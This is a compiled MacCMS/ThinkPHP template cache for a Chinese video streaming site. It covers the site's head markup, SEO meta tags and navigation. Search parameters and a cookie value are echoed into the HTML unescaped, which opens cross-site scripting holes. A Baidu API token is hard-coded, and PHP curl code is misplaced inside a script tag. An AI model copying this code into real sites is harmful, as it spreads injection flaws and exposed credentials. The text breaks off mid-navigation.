<?php if (!defined('THINK_PATH')) exit(); /*a:22:{s:34:"template/vfed/html/vod/search.html";i:1563527590;s:63:"/www/wwwroot/heiheiys.top/template/vfed/html/public/header.html";i:1558617932;s:64:"/www/wwwroot/heiheiys.top/template/vfed/html/public/include.html";i:1558681186;s:63:"/www/wwwroot/heiheiys.top/template/vfed/html/basics/seokey.html";i:1558617932;s:63:"/www/wwwroot/heiheiys.top/template/vfed/html/basics/themes.html";i:1558617932;s:63:"/www/wwwroot/heiheiys.top/template/vfed/html/basics/navbar.html";i:1558617932;s:63:"/www/wwwroot/heiheiys.top/template/vfed/html/basics/tabbar.html";i:1558617932;s:63:"/www/wwwroot/heiheiys.top/template/vfed/html/basics/search.html";i:1558617932;s:63:"/www/wwwroot/heiheiys.top/template/vfed/html/basics/detail.html";i:1558667458;s:63:"/www/wwwroot/heiheiys.top/template/vfed/html/module/paging.html";i:1558617932;s:63:"/www/wwwroot/heiheiys.top/template/vfed/html/module/notice.html";i:1558617932;s:63:"/www/wwwroot/heiheiys.top/template/vfed/html/basics/report.html";i:1558617932;s:63:"/www/wwwroot/heiheiys.top/template/vfed/html/module/relate.html";i:1558617932;s:63:"/www/wwwroot/heiheiys.top/template/vfed/html/basics/lucida.html";i:1558617932;s:64:"/www/wwwroot/heiheiys.top/template/vfed/html/basics/picture.html";i:1558617932;s:64:"/www/wwwroot/heiheiys.top/template/vfed/html/basics/listing.html";i:1558617932;s:63:"/www/wwwroot/heiheiys.top/template/vfed/html/basics/images.html";i:1558617932;s:63:"/www/wwwroot/heiheiys.top/template/vfed/html/public/footer.html";i:1558617932;s:63:"/www/wwwroot/heiheiys.top/template/vfed/html/basics/colors.html";i:1558617932;s:63:"/www/wwwroot/heiheiys.top/template/vfed/html/basics/global.html";i:1558617932;s:63:"/www/wwwroot/heiheiys.top/template/vfed/html/basics/caches.html";i:1567233713;s:63:"/www/wwwroot/heiheiys.top/template/vfed/html/basics/quicks.html";i:1558617932;}*/ ?>
<!DOCTYPE html>
<html>
<head>
<meta name="renderer" content="webkit" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="apple-mobile-web-app-title" content="<?php echo $maccms['site_name']; ?>" />
<meta name="viewport" content="initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no" />
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
 <script>
$urls = array(
    'http://v.ppppx.top/index.php',
    '<?php echo $maccms['http_type']; ?><?php echo $maccms['site_url']; ?><?php echo mac_url_vod_detail($obj); ?>',
);
$api = 'http://data.zz.baidu.com/urls?appid=1589891140533770&token=sz7wz88hymd1Erox&type=batch';
$ch = curl_init();
$options =  array(
    CURLOPT_URL => $api,
    CURLOPT_POST => true,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POSTFIELDS => implode("\n", $urls),
    CURLOPT_HTTPHEADER => array('Content-Type: text/plain'),
);
curl_setopt_array($ch, $options);
$result = curl_exec($ch);
echo $result;</script>
    <script type="application/ld+json">
    {
        "@context": "https://ziyuan.baidu.com/contexts/cambrian.jsonld",
        "@id": "<?php echo $maccms['http_type']; ?><?php echo $maccms['site_url']; ?><?php echo mac_url_vod_detail($obj); ?>",
        "appid": "1589891140533770",
        "title": "<?php echo mac_filter_html($obj['type']['type_name']); ?><?php echo mac_default(mac_filter_html($obj['vod_name']),'404'); ?><?php echo $obj['vod_play_list'][$param['sid']]['urls'][$param['nid']]['name']; ?><?php echo mac_default($vfedcc['seos']['vplay']['title'],'在线播放'); ?> - <?php echo $maccms['site_name']; ?>",
        "images": [
        "<?php echo mac_url_img($obj['vod_pic']); ?>"
        ], //请在此处添加希望在搜索结果中展示图片的url，可以添加1个或3个url
        "pubDate": "20<?php echo date('y-m-d',$obj['vod_time']); ?>T<?php echo date('h:m:s',$obj['vod_time']); ?>" // 需按照yyyy-mm-ddThh:mm:ss格式编写时间，字母T不能省去
    }
</script>
<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="<?php echo mac_url('rss/index'); ?>" />
<!--[if lt IE 9]><script type="text/javascript">window.location.href = '<?php echo mac_url("map/index"); ?>';</script><![endif]-->
<?php $version = parse_ini_file(substr($maccms['path_tpl'], strlen($maccms['path'])).'info.ini'); $version = stristr('127.0.0|192.168', substr($_SERVER['HTTP_HOST'], 0, 7)) == true ? time() : $version['version']; $vfedcc = file_exists('application/extra/vfedcc.php') ? require('application/extra/vfedcc.php') : require(substr($maccms['path_tpl'], strlen($maccms['path'])).'asset/fed/vfedcc.php'); ?>
<link href="<?php echo mac_url_img(mac_default($vfedcc['main']['icon'],substr($maccms['path_tpl'], strlen($maccms['path'])).'asset/img/favicon.png')); ?>" rel="apple-touch-icon-precomposed" />
<link href="<?php echo mac_url_img(mac_default($vfedcc['main']['icon'],substr($maccms['path_tpl'], strlen($maccms['path'])).'asset/img/favicon.png')); ?>" rel="shortcut icon" type="image/ico" />
<link rel="stylesheet" type="text/css" href="http://jt.ismicool.cn/ppxystop/css/style.css?v=<?php echo $version; ?>" />
<?php if($_COOKIE['fed_color']): ?>
<link rel="stylesheet" type="text/css" href="http://jt.ismicool.cn/ppxystop/css/<?php echo $_COOKIE['fed_color']; ?>.css?v=<?php echo $version; ?>" id="fed-colo-color" />
<?php elseif($vfedcc['rest']['theme']['skin']): ?>
<link rel="stylesheet" type="text/css" href="http://jt.ismicool.cn/ppxystop/css/<?php echo $vfedcc['rest']['theme']['skin']; ?>.css?v=<?php echo $version; ?>" id="fed-colo-color" />
<?php endif; if($vfedcc['main']['lazy']): ?>
<style type="text/css">.fed-list-pics{background-image:url("<?php echo mac_url_img($vfedcc['main']['lazy']); ?>");background-position: 50% 50%;background-size: cover}</style>
<?php endif; if($vfedcc['main']['bigs']): ?>
<style type="text/css">.fed-swip-lazy{background-image:url("<?php echo mac_url_img($vfedcc['main']['bigs']); ?>");background-position: 50% 50%;background-size: cover}</style>
<?php endif; if($vfedcc['main']['back']): ?>
<style type="text/css">body{background-image:url("<?php echo mac_url_img($vfedcc['main']['back']); ?>");background-attachment: fixed;background-repeat: no-repeat;background-position: top;background-size: auto 100vh;background-size: 101% 101%;}</style>
<?php endif; if($vfedcc['main']['wane']['state']): ?>
<style type="text/css">.fed-swip-title,.fed-list-pics,.fed-part-layout,.fed-list-info .fed-list-remarks,.fed-list-info .fed-list-play{border-radius:<?php echo $vfedcc['main']['wane']['value']; ?>}</style>
<?php endif; if($maccms['aid']==1): ?>
<title><?php echo mac_default($vfedcc['seos']['index']['title'],$maccms['site_name']); ?></title>
<meta name="keywords" content="<?php echo mac_default($vfedcc['seos']['index']['word'],$maccms['site_keywords']); ?>" />
<meta name="description" content="<?php echo mac_default($vfedcc['seos']['index']['info'],$maccms['site_description']); ?>" />
<meta itemprop="url" property="og:url" content="<?php echo $maccms['http_type']; ?><?php echo $maccms['site_url']; ?><?php echo mac_url('index/index'); ?>" />
<meta itemprop="name" property="og:title" content="<?php echo mac_default($vfedcc['seos']['index']['title'],$maccms['site_name']); ?>" />
<meta itemprop="image" property="og:image" content="http://jt.ismicool.cn/tubiao.png" />
<meta itemprop="description" property="og:description" content="<?php echo mac_default($vfedcc['seos']['index']['info'],$maccms['site_description']); ?>" />
<?php elseif($maccms['aid']==4): ?>
<title>用户求片留言 - <?php echo $maccms['site_name']; ?></title>
<meta name="keywords" content="留言板,<?php echo $maccms['site_keywords']; ?>" />
<meta name="description" content="<?php echo $maccms['site_description']; ?>" />
<meta itemprop="url" property="og:url" content="<?php echo $maccms['http_type']; ?><?php echo $maccms['site_url']; ?><?php echo mac_url('gbook/index'); ?>" />
<meta itemprop="name" property="og:title" content="留言板 - <?php echo $maccms['site_name']; ?>" />
<meta itemprop="image" property="og:image" content="http://jt.ismicool.cn/tubiao.png" />
<meta itemprop="description" property="og:description" content="<?php echo $maccms['site_description']; ?>" />
<?php elseif($maccms['aid']==6): ?>
<title>皮皮虾影视用户中心</title>
<meta name="keywords" content="个人中心,<?php echo $maccms['site_keywords']; ?>" />
<meta name="description" content="<?php echo $maccms['site_description']; ?>" />
<meta itemprop="url" property="og:url" content="<?php echo $maccms['http_type']; ?><?php echo $maccms['site_url']; ?><?php echo mac_url('user/index'); ?>" />
<meta itemprop="name" property="og:title" content="个人中心 - <?php echo $maccms['site_name']; ?>" />
<meta itemprop="image" property="og:image" content="http://jt.ismicool.cn/tubiao.png" />
<meta itemprop="description" property="og:description" content="<?php echo $maccms['site_description']; ?>" />
<?php elseif($maccms['aid']==11): ?>
<title>海量精彩<?php echo mac_filter_html(mac_default($obj['type_title'],$obj['type_name'])); ?> - <?php echo $maccms['site_name']; ?></title>
<meta name="keywords" content="<?php echo mac_filter_html(mac_default($obj['type_key'],$obj['type_name'])); ?>,<?php echo $maccms['site_name']; ?>" />
<meta name="description" content="<?php echo mac_default($obj['type_des'],$maccms['site_description']); ?>" />
<meta itemprop="url" property="og:url" content="<?php echo $maccms['http_type']; ?><?php echo $maccms['site_url']; ?><?php echo mac_url_type($obj); ?>" />
<meta itemprop="name" property="og:title" content="<?php echo mac_filter_html(mac_default($obj['type_title'],$obj['type_name'])); ?> - <?php echo $maccms['site_name']; ?>" />
<meta itemprop="image" property="og:image" content="http://jt.ismicool.cn/tubiao.png" />
<meta itemprop="description" property="og:description" content="<?php echo mac_default($obj['type_des'],$maccms['site_description']); ?>" />
<?php elseif($maccms['aid']==12): ?>
<title>海量精彩<?php echo $param['year']; ?><?php echo $param['area']; ?><?php echo $param['class']; ?><?php echo mac_filter_html($obj['type_name']); ?> 第<?php echo $param['page']; ?>页 - <?php echo $maccms['site_name']; ?></title>
<meta name="keywords" content="<?php echo mac_default($obj['type_key'],$maccms['site_keywords']); ?>,<?php echo $maccms['site_name']; ?>" />
<meta name="description" content="<?php echo mac_default($obj['type_des'],$maccms['site_description']); ?>" />
<meta itemprop="url" property="og:url" content="<?php echo $maccms['http_type']; ?><?php echo $maccms['site_url']; ?><?php echo mac_url_type($obj,['area'=>$param['area'],'lang'=>$param['lang'],'year'=>$param['year']],'show'); ?>" />
<meta itemprop="name" property="og:title" content="<?php echo $param['year']; ?><?php echo $param['area']; ?><?php echo mac_filter_html($obj['type_name']); ?> - <?php echo $maccms['site_name']; ?>" />
<meta itemprop="image" property="og:image" content="http://jt.ismicool.cn/tubiao.png" />
<meta itemprop="description" property="og:description" content="<?php echo mac_default($obj['type_des'],$maccms['site_description']); ?>" />
<?php elseif($maccms['aid']==13): ?>
<title>关于您搜索的<?php echo $param['wd']; ?><?php echo $param['actor']; ?><?php echo $param['director']; ?><?php echo $param['area']; ?>列出以下结果 <?php echo $maccms['site_name']; ?></title>
<meta name="keywords" content="<?php echo $param['wd']; ?>,<?php echo $param['actor']; ?>,<?php echo $param['director']; ?>,<?php echo $param['area']; ?>,<?php echo $maccms['site_name']; ?>" />
<meta name="description" content="<?php echo $maccms['site_description']; ?>" />
<meta itemprop="url" property="og:url" content="<?php echo $maccms['http_type']; ?><?php echo $maccms['site_url']; ?><?php echo mac_url('vod/search',['wd'=>$param['wd']]); ?>" />
<meta itemprop="name" property="og:title" content="<?php echo $param['wd']; ?><?php echo $param['actor']; ?><?php echo $param['director']; ?><?php echo $param['area']; ?><?php echo $param['year']; ?>_搜索结果 - <?php echo $maccms['site_name']; ?>" />
<meta itemprop="image" property="og:image" content="http://jt.ismicool.cn/tubiao.png" />
<meta itemprop="description" property="og:description" content="<?php echo $maccms['site_description']; ?>" />
<?php elseif($maccms['aid']==14): ?>
<title><?php echo mac_filter_html($obj['type']['type_name']); ?><?php echo mac_default(mac_filter_html($obj['vod_name']),'404'); ?>在线观看 - <?php echo $maccms['site_name']; ?></title>
<meta name="keywords" content="<?php echo $obj['vod_actor']; ?>,<?php echo $obj['vod_director']; ?>,<?php echo mac_filter_html($obj['vod_name']); ?>,<?php echo mac_filter_html($obj['type']['type_name']); ?>,<?php echo mac_filter_html(mac_default($vfedcc['seos']['vinfo']['word'],$obj['type_1']['type_name'])); ?>,<?php echo $maccms['site_name']; ?>" />
<meta name="description" content="<?php echo $vfedcc['seos']['vinfo']['info']; ?><?php echo $obj['vod_blurb']; ?>" />
<meta itemprop="url" property="og:url" content="<?php echo $maccms['http_type']; ?><?php echo $maccms['site_url']; ?><?php echo mac_url_vod_detail($obj); ?>" />
<meta itemprop="name" property="og:title" content="<?php echo mac_filter_html($obj['vod_name']); ?>_<?php echo mac_filter_html($obj['type']['type_name']); ?>_<?php echo mac_filter_html(mac_default($vfedcc['seos']['vinfo']['title'],$obj['type_1']['type_name'])); ?> - <?php echo $maccms['site_name']; ?>" />
<meta itemprop="type" property="og:type" content="videolist" />
<meta itemprop="image" property="og:image" content="http://jt.ismicool.cn/tubiao.png" />
<meta itemprop="class" property="og:video:class" content="<?php echo mac_filter_html($obj['type']['type_name']); ?>" />
<meta itemprop="actor" property="og:video:actor" content="<?php echo $obj['vod_actor']; ?>" />
<meta itemprop="uploadDate" property="og:video:date" content="<?php echo date('Y-m-d',$obj['vod_time']); ?>" />
<meta itemprop="contentLocation" property="og:video:area" content="<?php echo $obj['vod_area']; ?>" />
<meta itemprop="description" property="og:description" content="<?php echo $vfedcc['seos']['vinfo']['info']; ?><?php echo $obj['vod_blurb']; ?>" />
<?php elseif($maccms['aid']==15): ?>
<title><?php echo mac_filter_html($obj['type']['type_name']); ?><?php echo mac_default(mac_filter_html($obj['vod_name']),'404'); ?><?php echo $obj['vod_play_list'][$param['sid']]['urls'][$param['nid']]['name']; ?><?php echo mac_default($vfedcc['seos']['vplay']['title'],'在线播放'); ?> - <?php echo $maccms['site_name']; ?></title>
<meta name="keywords" content="<?php echo mac_default($vfedcc['seos']['vplay']['word'],'在线播放'); ?>,<?php echo $obj['vod_actor']; ?>,<?php echo $obj['vod_director']; ?>,<?php echo mac_filter_html($obj['vod_name']); ?>,<?php echo mac_filter_html($obj['type']['type_name']); ?>,<?php echo mac_filter_html($obj['type_1']['type_name']); ?>,<?php echo $maccms['site_name']; ?>" />
<meta name="description" content="<?php echo mac_default($vfedcc['seos']['vplay']['info'],'在线播放'); ?><?php echo $obj['vod_blurb']; ?>" />
<meta itemprop="url" property="og:url" content="<?php echo $maccms['http_type']; ?><?php echo $maccms['site_url']; ?><?php echo mac_url_vod_detail($obj); ?>" />
<meta itemprop="name" property="og:title" content="<?php echo mac_filter_html($obj['vod_name']); ?><?php echo $obj['vod_play_list'][$param['sid']]['urls'][$param['nid']]['name']; ?><?php echo mac_default($vfedcc['seos']['vplay']['title'],'在线播放'); ?>_<?php echo mac_filter_html($obj['type']['type_name']); ?> - <?php echo $maccms['site_name']; ?>" />
<meta itemprop="type" property="og:type" content="video" />
<meta itemprop="image" property="og:image" content="http://jt.ismicool.cn/tubiao.png" />
<meta itemprop="class" property="og:video:class" content="<?php echo mac_filter_html($obj['type']['type_name']); ?>" />
<meta itemprop="actor" property="og:video:actor" content="<?php echo $obj['vod_actor']; ?>" />
<meta itemprop="uploadDate" property="og:video:date" content="<?php echo date('Y-m-d',$obj['vod_time']); ?>" />
<meta itemprop="contentLocation" property="og:video:area" content="<?php echo $obj['vod_area']; ?>" />
<meta itemprop="description" property="og:description" content="<?php echo mac_default($vfedcc['seos']['vplay']['info'],'在线播放'); ?><?php echo $obj['vod_blurb']; ?>" />
<?php elseif($maccms['aid']==16): ?>
<title><?php echo mac_default(mac_filter_html($obj['vod_name']),'404'); ?>_<?php echo $obj['vod_down_list'][$param['sid']]['player_info']['show']; ?>_<?php echo mac_filter_html($obj['type']['type_name']); ?><?php echo mac_filter_html($obj['type_1']['type_name']); ?> - <?php echo $maccms['site_name']; ?></title>
<meta name="keywords" content="<?php echo $obj['vod_actor']; ?>,<?php echo $obj['vod_director']; ?>,<?php echo mac_filter_html($obj['vod_name']); ?>,<?php echo mac_filter_html($obj['type']['type_name']); ?>,<?php echo mac_filter_html($obj['type_1']['type_name']); ?>,<?php echo $maccms['site_name']; ?>" />
<meta name="description" content="<?php echo $obj['vod_blurb']; ?>" />
<meta itemprop="url" property="og:url" content="<?php echo $maccms['http_type']; ?><?php echo $maccms['site_url']; ?><?php echo mac_url_vod_detail($obj); ?>" />
<meta itemprop="name" property="og:title" content="<?php echo mac_filter_html($obj['vod_name']); ?>_<?php echo $obj['vod_down_list'][$param['sid']]['player_info']['show']; ?>_<?php echo mac_filter_html($obj['type']['type_name']); ?><?php echo mac_filter_html($obj['type_1']['type_name']); ?> - <?php echo $maccms['site_name']; ?>" />
<meta itemprop="type" property="og:type" content="download" />
<meta itemprop="image" property="og:image" content="http://jt.ismicool.cn/tubiao.png" />
<meta itemprop="class" property="og:video:class" content="<?php echo mac_filter_html($obj['type']['type_name']); ?>" />
<meta itemprop="actor" property="og:video:actor" content="<?php echo $obj['vod_actor']; ?>" />
<meta itemprop="uploadDate" property="og:video:date" content="<?php echo date('Y-m-d',$obj['vod_time']); ?>" />
<meta itemprop="contentLocation" property="og:video:area" content="<?php echo $obj['vod_area']; ?>" />
<meta itemprop="description" property="og:description" content="<?php echo $obj['vod_blurb']; ?>" />
<?php elseif($maccms['aid']==20): ?>
<title><?php echo mac_default($vfedcc['seos']['artic']['title'],'资讯'); ?> - <?php echo $maccms['site_name']; ?></title>
<meta name="keywords" content="<?php echo mac_default($vfedcc['seos']['artic']['word'],'资讯,'.$maccms['site_keywords']); ?>" />
<meta name="description" content="<?php echo mac_default($vfedcc['seos']['artic']['info'],'24小时滚动报道国内、国际及社会新闻。每日编发新闻数以万计。'); ?>" />
<meta itemprop="url" property="og:url" content="<?php echo $maccms['http_type']; ?><?php echo $maccms['site_url']; ?><?php echo mac_url('art/index'); ?>" />
<meta itemprop="name" property="og:title" content="<?php echo mac_default($vfedcc['seos']['artic']['title'],'资讯'); ?> - <?php echo $maccms['site_name']; ?>" />
<meta itemprop="image" property="og:image" content="http://jt.ismicool.cn/tubiao.png" />
<meta itemprop="description" property="og:description" content="<?php echo mac_default($vfedcc['seos']['artic']['info'],'24小时滚动报道国内、国际及社会新闻。每日编发新闻数以万计。'); ?>" />
<?php elseif($maccms['aid']==21): ?>
<title><?php echo mac_filter_html(mac_default($obj['type_title'],$obj['type_name'])); ?> - <?php echo $maccms['site_name']; ?></title>
<meta name="keywords" content="<?php echo mac_filter_html(mac_default($obj['type_key'],$obj['type_name'])); ?>,<?php echo $maccms['site_name']; ?>" />
<meta name="description" content="<?php echo mac_default($obj['type_des'],$maccms['site_description']); ?>" />
<meta itemprop="url" property="og:url" content="<?php echo $maccms['http_type']; ?><?php echo $maccms['site_url']; ?><?php echo mac_url_type($obj); ?>" />
<meta itemprop="name" property="og:title" content="<?php echo mac_filter_html($obj['type_name']); ?> - <?php echo $maccms['site_name']; ?>" />
<meta itemprop="image" property="og:image" content="http://jt.ismicool.cn/tubiao.png" />
<meta itemprop="description" property="og:description" content="<?php echo mac_default($obj['type_des'],$maccms['site_description']); ?>" />
<?php elseif($maccms['aid']==24): ?>
<title><?php echo mac_default(mac_filter_html($obj['art_name']),'404'); ?>_<?php echo mac_default($vfedcc['seos']['rinfo']['title'],'资讯'); ?>_<?php echo mac_filter_html($obj['type']['type_name']); ?> - <?php echo $maccms['site_name']; ?></title>
<meta name="keywords" content="<?php echo mac_filter_html(mac_default($obj['art_tag'],$obj['type']['type_name'])); ?>,<?php echo mac_default($vfedcc['seos']['rinfo']['word'],'资讯'); ?>,<?php echo $maccms['site_name']; ?>" />
<meta name="description" content="<?php echo mac_default($vfedcc['seos']['rinfo']['info'],'资讯'); ?><?php echo $obj['art_blurb']; ?>" />
<meta itemprop="url" property="og:url" content="<?php echo $maccms['http_type']; ?><?php echo $maccms['site_url']; ?><?php echo mac_url_art_detail($obj); ?>" />
<meta itemprop="name" property="og:title" content="<?php echo mac_filter_html($obj['art_name']); ?>_<?php echo mac_default($vfedcc['seos']['rinfo']['title'],'资讯'); ?>_<?php echo mac_filter_html($obj['type']['type_name']); ?> - <?php echo $maccms['site_name']; ?>" />
<meta itemprop="type" property="og:type" content="article" />
<meta itemprop="image" property="og:image" content="http://jt.ismicool.cn/tubiao.png" />
<meta itemprop="releaseDate" property="og:release_date" content="<?php echo date('Y-m-d',$obj['art_time']); ?>"/>
<meta itemprop="description" property="og:description" content="<?php echo mac_default($vfedcc['seos']['rinfo']['info'],'资讯'); ?><?php echo $obj['art_blurb']; ?>" />
<?php elseif($maccms['aid']==30): ?>
<title><?php echo mac_default($vfedcc['seos']['topic']['title'],'专题首页'); ?> - <?php echo $maccms['site_name']; ?></title>
<meta name="keywords" content="<?php echo mac_default($vfedcc['seos']['topic']['word'],'电影专题,电视剧专题,动漫专题,综艺专题'); ?>" />
<meta name="description" content="<?php echo mac_default($vfedcc['seos']['topic']['info'],$maccms['site_description']); ?>" />
<meta itemprop="url" property="og:url" content="<?php echo $maccms['http_type']; ?><?php echo $maccms['site_url']; ?><?php echo mac_url_topic_index(); ?>" />
<meta itemprop="name" property="og:title" content="<?php echo mac_default($vfedcc['seos']['topic']['title'],'专题首页'); ?> - <?php echo $maccms['site_name']; ?>" />
<meta itemprop="image" property="og:image" content="http://jt.ismicool.cn/tubiao.png" />
<meta itemprop="description" property="og:description" content="<?php echo mac_default($vfedcc['seos']['topic']['info'],$maccms['site_description']); ?>" />
<?php elseif($maccms['aid']==34): ?>
<title><?php echo mac_default($obj['topic_title'],$obj['topic_name']); ?>_<?php echo mac_default($vfedcc['seos']['tinfo']['title'],'专题'); ?> - <?php echo $maccms['site_name']; ?></title>
<meta name="keywords" content="<?php echo mac_default($obj['topic_key'],$obj['topic_name']); ?>,<?php echo mac_default($vfedcc['seos']['tinfo']['word'],'专题'); ?>,<?php echo $maccms['site_name']; ?>" />
<meta name="description" content="<?php echo mac_default($vfedcc['seos']['tinfo']['info'],'专题'); ?><?php echo mac_default($obj['topic_des'],$obj['topic_blurb']); ?>" />
<meta itemprop="url" property="og:url" content="<?php echo $maccms['http_type']; ?><?php echo $maccms['site_url']; ?><?php echo mac_url_topic_detail($obj); ?>" />
<meta itemprop="name" property="og:title" content="<?php echo $obj['topic_name']; ?>_<?php echo mac_default($vfedcc['seos']['tinfo']['title'],'专题'); ?> - <?php echo $maccms['site_name']; ?>" />
<meta itemprop="image" property="og:image" content="http://jt.ismicool.cn/tubiao.png" />
<meta itemprop="description" property="og:description" content="<?php echo mac_default($vfedcc['seos']['tinfo']['info'],'专题'); ?><?php echo mac_default($obj['topic_des'],$obj['topic_blurb']); ?>" />
<?php elseif($maccms['aid']==80): ?>
<title><?php echo mac_default($vfedcc['seos']['actor']['title'],'明星首页'); ?> - <?php echo $maccms['site_name']; ?></title>
<meta name="keywords" content="<?php echo mac_default($vfedcc['seos']['actor']['word'],'明星娱乐,八卦新闻,明星绯闻,影视资讯,音乐资讯,八卦爆料'); ?>" />
<meta name="description" content="<?php echo mac_default($vfedcc['seos']['actor']['info'],'明星资讯网为大家提供, 明星娱乐八卦新闻, 明星绯闻,影视资讯,音乐资讯,八卦爆料, 娱乐视频等'); ?>" />
<meta itemprop="url" property="og:url" content="<?php echo $maccms['http_type']; ?><?php echo $maccms['site_url']; ?><?php echo mac_url_topic_index(); ?>" />
<meta itemprop="name" property="og:title" content="<?php echo mac_default($vfedcc['seos']['actor']['title'],'明星首页'); ?> - <?php echo $maccms['site_name']; ?>" />
<meta itemprop="image" property="og:image" content="http://jt.ismicool.cn/tubiao.png" />
<meta itemprop="description" property="og:description" content="<?php echo mac_default($vfedcc['seos']['actor']['info'],'明星资讯网为大家提供, 明星娱乐八卦新闻, 明星绯闻,影视资讯,音乐资讯,八卦爆料, 娱乐视频等'); ?>" />
<?php elseif($maccms['aid']==84): ?>
<title><?php echo $obj['actor_name']; ?>的<?php echo mac_default($vfedcc['seos']['ainfo']['title'],'个人资料'); ?> - <?php echo $maccms['site_name']; ?></title>
<meta name="keywords" content="<?php echo mac_default($obj['actor_key'],$obj['actor_name']); ?>,<?php echo mac_default($vfedcc['seos']['ainfo']['word'],'明星'); ?>,<?php echo $maccms['site_name']; ?>" />
<meta name="description" content="<?php echo mac_default($vfedcc['seos']['ainfo']['info'],'明星'); ?><?php echo mac_default($obj['actor_blurb'],$maccms['site_description']); ?>" />
<meta itemprop="url" property="og:url" content="<?php echo $maccms['http_type']; ?><?php echo $maccms['site_url']; ?><?php echo mac_url_actor_detail($obj); ?>" />
<meta itemprop="name" property="og:title" content="<?php echo $obj['actor_name']; ?>_<?php echo mac_default($vfedcc['seos']['ainfo']['title'],'个人资料'); ?> - <?php echo $maccms['site_name']; ?>" />
<meta itemprop="image" property="og:image" content="http://jt.ismicool.cn/tubiao.png" />
<meta itemprop="description" property="og:description" content="<?php echo mac_default($vfedcc['seos']['ainfo']['info'],'明星'); ?><?php echo mac_default($obj['actor_blurb'],$maccms['site_description']); ?>" />
<?php endif; ?><script type="text/javascript">
if(document.cookie.match(new RegExp('(^| )fed_color=([^;]*)(;|$)')) != null) {
	var color = document.cookie.match(new RegExp('(^| )fed_color=([^;]*)(;|$)'));
	if(color[2] == 'white') {
		var elementid = document.getElementById('fed-colo-color');
		if(elementid) elementid.parentNode.removeChild(elementid);
	} else if(!document.getElementById('fed-colo-color')) {
		var style = document.createElement('link');
		style.type = 'text/css';
		style.rel = 'stylesheet';
		style.id = 'fed-colo-color';
		style.href = 'http://jt.ismicool.cn/ppxystop/css/' + unescape(color[2]) + '.css?v=<?php echo $version; ?>';
		document.getElementsByTagName('head').item(0).appendChild(style);
	} else document.getElementById('fed-colo-color').href = 'http://jt.ismicool.cn/ppxystop/css/' + unescape(color[2]) + '.css?v=<?php echo $version; ?>';
}
</script><?php echo $vfedcc['main']['meta']; ?>
<basetarget=”_blank”>
</head>
<body class="fed-min-width">
<div class="fed-head-info fed-back-whits fed-min-width fed-box-shadow">
	<div class="fed-part-case">
		<div class="fed-navs-info">
			<ul class="fed-menu-info">
				<li class="fed-pull-left">
					<a class="fed-menu-logo fed-show-kind" href="<?php echo $maccms['path']; ?>"><img width="96" height="40" alt="<?php echo $maccms['site_name']; ?>" src="<?php echo mac_url_img(mac_default($maccms['site_logo'],substr($maccms['path_tpl'], strlen($maccms['path'])).'asset/img/logo.png')); ?>" /></a>
				</li>
				<li class="fed-pull-left">
					<a class="fed-menu-title fed-show-kind fed-font-xvi<?php if($maccms['aid']==1): ?> fed-text-green<?php endif; ?> fed-hide fed-show-md-block" href="<?php echo $maccms['path']; ?>">首页</a>
				</li>
				<?php $__TAG__ = '{"ids":"parent","order":"asc","by":"sort","num":"'.$vfedcc['navs']['head']['value'].'","id":"vo","key":"key"}';$__LIST__ = model("Type")->listCacheData($__TAG__); if(is_array($__LIST__['list']) || $__LIST__['list'] instanceof \think\Collection || $__LIST__['list'] instanceof \think\Paginator): $key = 0; $__LIST__ = $__LIST__['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($key % 2 );++$key;?>
				<li class="fed-pull-left">
					<a class="fed-menu-title fed-show-kind fed-font-xvi<?php if($vo['type_id']==$obj['type_id']||$vo['type_id']==$obj['type_1']['type_id']||$vo['type_id']==$obj['parent']['type_id']): ?> fed-text-green<?php endif; ?> fed-hide<?php if($key>$vfedcc['navs']['head']['value']-3): ?> fed-show-lg-block<?php else: ?> fed-show-md-block<?php endif; ?>" href="<?php echo mac_url_type($vo); ?>"><?php echo mac_filter_html($vo['type_name']); ?></a>
				</li>
				<?php endforeach; endif; else: echo "" ;endif; if($vfedcc['navs']['arts']['state']): ?>
				<li class="fed-pull-left">
					<a class="fed-menu-title fed-show-kind fed-font-xvi<?php if($maccms['aid']==20): ?> fed-text-green<?php endif; ?> fed-hide fed-show-md-block" href="<?php echo mac_default($vfedcc['navs']['arts']['link'],mac_url('art/index')); ?>"><?php echo mac_default($vfedcc['navs']['arts']['name'],'资讯'); ?></a>
				</li>
				<?php endif; if($vfedcc['navs']['live']['state']): if($vfedcc['navs']['live']['link']): ?>
				<li class="fed-pull-left">
					<a class="fed-menu-title fed-show-kind fed-font-xvi<?php if($maccms['aid']==2): ?> fed-text-green<?php endif; ?> fed-hide fed-show-md-block" href="<?php echo $vfedcc['navs']['live']['link']; ?>"><?php echo mac_default($vfedcc['navs']['live']['name'],'直播'); ?></a>
				</li>
				<?php else: $__TAG__ = '{"ids":"parent","flag":"vod","id":"vo","key":"key"}';$__LIST__ = model("Type")->listCacheData($__TAG__); if(is_array($__LIST__['list']) || $__LIST__['list'] instanceof \think\Collection || $__LIST__['list'] instanceof \think\Paginator): $key = 0; $__LIST__ = $__LIST__['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($key % 2 );++$key;if(stristr($vo['type_name'],'直播')==true): ?>
				<li class="fed-pull-left">
					<a class="fed-menu-title fed-show-kind fed-font-xvi<?php if($vo['type_id']==$obj['type_id']||$vo['type_id']==$obj['type_1']['type_id']||$vo['type_id']==$obj['parent']['type_id']): ?> fed-text-green<?php endif; ?> fed-hide fed-show-md-block" href="<?php echo mac_url_type($vo); ?>"><?php echo mac_filter_html($vo['type_name']); ?></a>
				</li>
				<?php endif; endforeach; endif; else: echo "" ;endif; endif; endif; if($vfedcc['navs']['song']['state']): ?>
				<li class="fed-pull-left">
